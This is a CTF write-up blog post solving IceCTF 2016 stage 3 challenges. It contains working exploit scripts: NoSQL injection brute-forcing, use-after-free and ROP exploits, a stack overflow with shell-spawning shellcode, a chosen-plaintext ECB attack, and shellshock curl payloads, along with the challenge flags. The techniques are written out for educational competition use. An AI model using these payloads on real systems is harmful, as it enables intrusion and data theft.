---
layout: post
alias: "/blog/2016/08/27/icectf-2016-stage3/"
date: "2016-08-27T01:22:15+09:00"
title: "IceCTF 2016: stage3"
tags: [ "ctf", "writeup", "icectf" ]
"target_url": [ "https://icec.tf/" ]
---

## Corrupt Transmission

The file seems to be a PNG, but it is corrupted. The `file` and `xxd` says that the magic numbers is wrong, and you can get the flag after fixing it.

``` sh
$ file corrupt.png
corrupt.png: data
$ xxd corrupt.png | head -n 1
00000000: 9050 4e47 0e1a 0a1b 0000 000d 4948 4452  .PNG........IHDR
```

``` sh
$ file corrupt.png
corrupt.png: PNG image data, 500 x 408, 8-bit/color RGBA, non-interlaced
$ xxd corrupt.png | head -n 1
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
```

`IceCTF{t1s_but_4_5cr4tch}`



## Blue Monday

The given `blue_monday` is MIDI file, but it seems to say nothing about flag when I plays it with MIDI player.
So I used `xxd` and noticed it has the flag as a text. 

``` sh
$ cat blue_monday | perl -ne 's/\\\x80(.)/print $1/ge'
IceCTF{HAck1n9_mU5Ic_W17h_mID15_L3t5_H4vE_a_r4v3}
```


## ChainedIn

Do blind SQL injection to MongoDB.
In the login form, it sends data as a json, and you can inject your statements there.

``` sh
$ curl http://chainedin.vuln.icec.tf/login -H 'Content-Type: application/json;charset=UTF-8' --data-binary '{ "user": "admin", "pass": { "$gt": "IceCTF{A" } }'
{"message":"Welcome back Administrator!"}
$ curl http://chainedin.vuln.icec.tf/login -H 'Content-Type: application/json;charset=UTF-8' --data-binary '{ "user": "admin", "pass": { "$gt": "IceCTF{z" } }'
{"message":"Invalid Credentials"}
```

You should use binary search to reduce the amount of your queries.

``` python
#!/usr/bin/env python3
import requests
import json
import string

def pass_gt(s):
    url = 'http://chainedin.vuln.icec.tf/login'
    headers = { 'Content-Type': 'application/json;charset=UTF-8' }
    data = { 'user': 'admin', 'pass': { '$gt': s } }
    data = json.dumps(data).encode()
    resp = requests.post(url, headers=headers, data=data)
    resp = json.loads(resp.text)
    msg = resp['message']
    if msg == 'Welcome back Administrator!':
        print('pass >  {}'.format(repr(s)))
        return True
    elif msg == 'Invalid Credentials':
        print('pass <= {}'.format(repr(s)))
        return False
    else:
        print(msg)
        assert False

letters = string.digits + string.ascii_uppercase + '_' + string.ascii_lowercase + '{}'
assert list(letters) == sorted(letters)

s = ''
while s.find('}') == -1:
    l = 0
    r = len(letters)
    while l + 1 < r:
        m = (l + r) // 2
        if pass_gt(s + letters[m] + '\xff'):
            l = m
        else:
            r = m
    s += letters[r]
print('pass == {}'.format(repr(s)))
```



## Drumpf Hotels

The `drumpf` binary has two global vars.
They have pointer to `malloc`ed structures.
There is an use-after-free vulnerability, because it doesn't assign `NULL` to the vars in the `delete_booking` function.

``` asm
g_book_suite: 0x804b088
g_book_room: 0x804b08c
```

``` c
struct booked_suite_t {
    void (*print_name)();
    char name[0x100];
    int number;
};
struct booked_room_t {
    int number;
    char name[0x100];
};
```

To get flag, we want to replace the function pointer to `print_name` with one of `flag` function.

1.   `malloc` a suite ans set the global var
2.   `free` it, without assigning `NULL`
3.   `malloc` a room and write a pointer to `flag`
4.   read the room-structure as a suite-structure and jump to `flag`

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='drumpf.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=6502, type=int)
args = parser.parse_args()

elf = ELF('./drumpf')
p = remote(args.host, args.port)

p.recvuntil('$$$ ')
p.sendline('1') # Book a suite
p.recvuntil('Name: ')
p.sendline('foo')
p.recvuntil('Suite number: ')
p.sendline('123')

p.recvuntil('$$$ ')
p.sendline('3') # Delete booking

p.recvuntil('$$$ ')
p.sendline('2') # Book a room
p.recvuntil('Name: ')
p.sendline('bar')
p.recvuntil('Room number: ')
p.sendline(str(elf.symbols['flag']))

p.recvuntil('$$$ ')
p.sendline('4') # Print booking
log.info(p.recvline())

p.recvuntil('$$$ ')
p.sendline('5') # Quit

p.recvall()
```

``` sh
$ ./a.py
[+] Opening connection to drumpf.vuln.icec.tf on port 6502: Done
[*] IceCTF{they_can_take_our_overflows_but_they_will_never_take_our_use_after_freeeedom!}
[+] Recieving all data: Done (28B)
[*] Closed connection to drumpf.vuln.icec.tf port 6502
```

## ROPi

`Ritorno orientata programmazione` seems to mean return-oriented programming in Italian.
You can use a translation service.

This is a ROP problem, and it seems that you are expected to call `ret`, `ori` and `pro`.
Some of them require the keys as arguments.
You can build a simple chain, but it may be too long for the `read`.
So you need to do stack pivot and re-`read` the another chain.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='ropi.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=6500, type=int)
args = parser.parse_args()
context.log_level = 'debug'

read_plt = 0x80483b0
ret_func = 0x8048569
ori_func = 0x80485c4
pro_func = 0x804862c
pop_ebp = 0x080486ef # pop ebp ; ret
pop_esi_edi_ebp = 0x80486ed # pop esi ; pop edi ; pop ebp ; ret
leave = 0x08048498 # leave  ; ret
static = 0x804a000
ret_key_8 = 0xbadbeeef
ori_key_8 = 0xabcdefff
ori_key_12 = 0x78563412

p = remote(args.host, args.port)
p.recvuntil('Vuole lasciare un messaggio?')

payload = ''
payload += 'AAAA' * 10
payload += p32(static + 0x900) # ebp
payload += p32(read_plt)
payload += p32(leave)
payload += p32(0) # stdin
payload += p32(static + 0x900) # buf
payload += p32(0x1000) # len
log.info('payload length: ' + hex(len(payload)))
assert len(payload) <= 0x40
p.send(payload)

payload = ''
payload += p32(static + 0x900) # esp
payload += p32(ret_func)
payload += p32(pop_ebp)
payload += p32(ret_key_8)
payload += p32(ori_func)
payload += p32(pop_ebp)
payload += p32(ori_key_8)
payload += p32(pro_func)
p.send(payload)

p.recvall()
```

## A Strong Feeling

It compares the input with the flag, like:

``` asm
  4010fa:	81 fa 49 00 00 00    	cmp    edx,0x49
  401178:	81 fa 63 00 00 00    	cmp    edx,0x63
  4011ff:	81 fa 65 00 00 00    	cmp    edx,0x65
  401284:	81 fa 43 00 00 00    	cmp    edx,0x43
  401309:	81 fa 54 00 00 00    	cmp    edx,0x54
  401387:	81 fa 46 00 00 00    	cmp    edx,0x46
```

So, you can:

``` sh
$ objdump -d -M intel a_strong_feeling | grep 'cmp\s*edx' | sed 's/.*\(..\)/\1/' | xxd -p -r
```

but the flag is `IceCTF{pip_install_angr}`.



## Matrix

The text has $32$ numbers and each number is $4$ byte integer.
To make this a square matrix, you can write them in binary numeral, and the result seems to be a QRCode.

``` sh
$ cat matrix.txt | perl -e 'printf "0%032b\n", hex $_ for <>' | sed $'s/0/\033[37;47m /g ; s/1/\033[30;40m /g'
```

Read it, the flag appears: `IceCTF{1F_y0U_l0oK_c1Os3lY_EV3rY7h1n9_i5_1s_4nD_0s}`.

The QRCode has some duplicated rows and columns. If your reader won't decode, you should remove them.



## So Close

It has a buffer overflow vulnability and no NX bit.
We can rewrite many bytes on stack, but basically affect only the ebp.
So I rewrote the lowest byte of ebp to $0$ and did stack pivot with `leave`.
Also I used `ret`s as a nop sled and send a simple ROP to exec a shellcode.

``` python
#!/usr/bin/env python3
import sys
import time
import struct
p32 = lambda x: struct.pack('I', x)

read_len = 0x110
ret = 0x080482ba # ret
read_plt = 0x80482f0
static_addr = 0x8049000

payload = b''
payload += p32(read_plt)
payload += p32(static_addr + 0x500)
payload += p32(0)
payload += p32(static_addr + 0x500)
payload += p32(0x100)
payload = p32(ret) * (read_len // 4 - len(payload) // 4 - 1) + payload
payload += b'\0'
sys.stdout.buffer.write(payload)
sys.stdout.flush()

time.sleep(1)

# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
sys.stdout.buffer.write(shellcode)
sys.stdout.flush()

time.sleep(1)

sys.stdout.buffer.write(b'id\n')
sys.stdout.flush()
```

`IceCTF{eeeeeeee_bbbbbbbbb_pppppppp_woooooo}`



## l33tcrypt

Do chosen-plaintext attack for the block cipher.

TODO: research/ask the name of this method. I do the exactly same things in last week for Encryption Service, ABCTF.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='l33tcrypt.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=6001, type=int)
parser.add_argument('--prefix')
parser.add_argument('--wait', type=float)
args = parser.parse_args()

import base64

chunk_size = 16

def chunks(x):
    ys = []
    while x:
        ys.append(x[:chunk_size])
        x = x[chunk_size:]
    return ys

header = 'l33tserver please'

def query(s):
    assert s.startswith(header)
    p = remote(args.host, args.port)
    p.recvuntil('Send me something to encrypt:\n')
    p.sendline(base64.b64encode(s))
    p.recvuntil('Your l33tcrypted data:\n')
    t = p.recvline()
    p.close()
    log.info('plaintext:  %s', ' '.join(chunks(s)))
    log.info('ciphertext: %s', ' '.join(chunks(t)))
    if args.wait:
        time.sleep(args.wait)
    return base64.b64decode(t)

import string
flag = args.prefix or ''
while True:
    padding = '#' * ((- len(header + flag + '#')) % chunk_size)
    assert len(header + padding + flag + '#') % chunk_size == 0
    i =    len(header + padding + flag + '#') // chunk_size - 1
    correct = chunks(query(header + padding))[i]
    for c in list(string.printable):
        if chunks(query(header + padding + flag + c))[i] == correct:
            flag += c
            log.success('flag updated: ' + repr(flag))
            break
    else:
        break
log.success('flag: ' + repr(flag))
```

`IceCTF{unleash_th3_Blocks_aNd_find_what_you_seek}`



## Quine

The server compiles and executes the sent C-language program 20 times, while the program outputs the itself.
After some surveying, I've noticed that trailing letters are permitted, while it can be compiled.

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='quine.vuln.icec.tf')
parser.add_argument('port', nargs='?', default=5500, type=int)
args = parser.parse_args()

quote = lambda s: s.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n')

a = '''\
#include <stdio.h>
#include <dirent.h>
char *code = "'''

b = '''";
void quote(char *s) {
 for (; *s; ++ s) {
  switch (*s) {
   case '\\\\': printf("\\\\\\\\"); break;
   case '"':    printf("\\\\\\"");  break;
   case '\\n':  printf("\\\\n");    break;
   default:     printf("%c", *s);   break;
  }
 }
}
void quine(void) {
 char *s = code;
 for (; *s; ++ s) {
  if (s[0] == '@' && s[1] == '@') {
    quote(code);
    ++ s;
  } else {
    printf("%c", *s);
  }
 }
}
void ls(char *s) {
 DIR *dir = opendir(s);
 struct dirent *ent;
 for(; ent = readdir(dir);) printf("// %s\\n", ent->d_name);
}
void cat(char *s) {
 FILE *fh;
 char buf[64];
 fh = fopen(s, "r");
 printf("// %s", fgets(buf, sizeof(buf), fh));
}
int main(void) {
 quine();
 ls(".");
 ls("..");
 cat("../flag.txt");
 return 0;
}
'''

code = '{}{}@@{}{}'.format(a, quote(a), quote(b), b)

p = remote(args.host, args.port)
p.recvline()
p.sendline(code)
p.sendline('.')
print(p.recvall())
```







## RSA2

In this time, the $n, e, c$ seems ordinal. So you cannot solve this unless the $n$ is easily factorable.

``` python
#!/usr/bin/env python3
n = 0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9f
e = 0x10001
c = 0x3dbf00a02f924a70f44bdd69e73c46241e9f036bfa49a0c92659d8eb0fe47e42068eaf156a9b3ee81651bc0576a91ffed48610c158dc8d2fb1719c7242704f0d965f8798304925a322c121904b91e5fc5eb3dc960b03eb8635be53b995217d4c317126e0ec6e9a9acfd5d915265634a22a612de962cfaa2e0443b78bdf841ff901423ef765e3d98b38bcce114fede1f13e223b9bd8155e913c8670d8b85b1f3bcb99353053cdb4aef1bf16fa74fd81e42325209c0953a694636c0ce0a19949f343dc229b2b7d80c3c43ebe80e89cbe3a3f7c867fd7cee06943886b0718a4a3584c9d9f9a66c9de29fda7cfee30ad3db061981855555eeac01940b1924eb4c301

# http://factordb.com
p = 57970027
assert n % p == 0
q = n // p

import gmpy2
from Crypto.PublicKey import RSA
d = lambda p, q, e: int(gmpy2.invert(e, (p-1)*(q-1)))

key = RSA.construct((n, e, d(p,q,e)))
import binascii
print(binascii.unhexlify(hex(key.decrypt(c))[2:]).decode())
```




## Geocities

<small>
Solved by [@tukejonny](https://twitter.com/tukejonny).
</small>

Do shellshock. The flag is in the MySQL.

``` sh
$ curl http://geocities.vuln.icec.tf -H 'User-Agent: () { :; } ; echo Content-Type:text/plain ; echo ; /bin/sh -c "ls"'
blog.html
get_posts.pl
img
index.cgi
```

``` sh
$ curl http://geocities.vuln.icec.tf -H 'User-Agent: () { :; } ; echo Content-Type:text/plain ; echo ; /bin/sh -c "head index.cgi"'
#!/fbash

IFS=$'\n'
posts_data=`./get_posts.pl`

echo "Content-type: text/html"
echo ""
cat <<EOT
<!DOCTYPE html>
<html>
```

``` perl
$ curl http://geocities.vuln.icec.tf -H 'User-Agent: () { :; } ; echo Content-Type:text/plain ; echo ; /bin/sh -c "cat get_posts.pl"'
#!/usr/bin/perl

use strict;
use DBI;

my $dbh = DBI->connect(
    "dbi:mysql:dbname=geocities;host=icectf_mariadb",
    "geocities",
    "geocities",
    { RaiseError => 1 },
) or die $DBI::errstr;

my $sth = $dbh->prepare("SELECT * from Posts ORDER BY post_date DESC");
$sth->execute();

my $row;
while ($row = $sth->fetchrow_arrayref()) {
    print "@$row[1];@$row[2];@$row[3]\n";
}

$sth->finish();
$dbh->disconnect();
```

``` perl
$ curl http://geocities.vuln.icec.tf -H 'User-Agent: () { :; } ; echo Content-Type:text/plain ; echo ; /usr/bin/perl -e '\''use DBI ; my $dbh = DBI->connect("dbi:mysql:dbname=geocities;host=icectf_mariadb", "geocities", "geocities", { RaiseError => 1 }, ); my $sth = $dbh->prepare("SELECT * FROM 47a6fd2ca39d2b0d6eea1c30008dd889"); $sth->execute(); my $row; while ($row = $sth->fetchrow_arrayref()) { print "@$row[1];@$row[2];@$row[3]\n"; } $sth->finish(); $dbh->disconnect();'\'''
IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7};;
```
